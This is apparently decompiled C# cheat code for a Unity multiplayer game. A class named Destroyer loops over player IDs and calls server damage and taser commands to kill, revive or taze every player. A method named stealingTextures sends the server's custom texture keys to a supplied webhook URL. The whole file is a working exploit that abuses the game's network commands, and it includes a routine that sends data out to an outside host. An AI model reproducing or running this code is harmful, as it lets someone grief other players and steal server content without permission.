using System;
using System.Collections.Generic;
using Life;
using UnityEngine;

// Token: 0x02000003 RID: 3
public class Destroyer
{
	// Token: 0x0600000A RID: 10 RVA: 0x0000481C File Offset: 0x00002C1C
	public static void killAllPlayer()
	{
		for (int i = 0; i < 2000; i++)
		{
			Utils.smethod_0("CmdDamagePlayer", Nova.character.weaponSystem, new object[] { i, 100 });
		}
	}

	// Token: 0x0600000B RID: 11 RVA: 0x00004890 File Offset: 0x00002C90
	public static void reviveAllPlayer()
	{
		for (int i = 0; i < 2000; i++)
		{
			Utils.smethod_0("CmdDamagePlayer", Nova.character.weaponSystem, new object[] { i, -100 });
		}
	}

	// Token: 0x0600000C RID: 12 RVA: 0x00004904 File Offset: 0x00002D04
	public static void tazeAllPlayer()
	{
		for (int i = 0; i < 2000; i++)
		{
			Utils.smethod_0("CmdTaze", Nova.character.weaponSystem, new object[] { true, i });
		}
	}

	// Token: 0x0600000D RID: 13 RVA: 0x00004978 File Offset: 0x00002D78
	public static void stealingTextures(string webhookurl)
	{
		Dictionary<string, Texture> serigraphies = Nova.serigraphies;
		foreach (KeyValuePair<string, Texture> keyValuePair in serigraphies)
		{
			Utils.smethod_2(webhookurl, keyValuePair.Key);
		}
	}
}
